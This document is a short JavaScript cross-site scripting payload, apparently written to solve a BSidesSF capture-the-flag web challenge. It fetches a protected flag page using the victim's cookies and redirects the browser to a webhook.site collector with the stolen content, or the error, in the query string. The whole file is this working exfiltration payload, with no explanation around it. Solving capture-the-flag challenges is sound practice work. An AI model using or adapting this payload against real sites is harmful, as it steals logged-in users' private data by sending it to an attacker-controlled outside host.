(async () => {
  try {
    const res = await fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', {
      credentials: 'include'
    });

    const text = await res.text();

    location.href =
      'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?flag=' +
      encodeURIComponent(text);
  } catch (e) {
    location.href =
      'https://webhook.site/a258ded4-e428-4f12-8023-ea9e69072dde/?err=' +
      encodeURIComponent(String(e));
  }
})();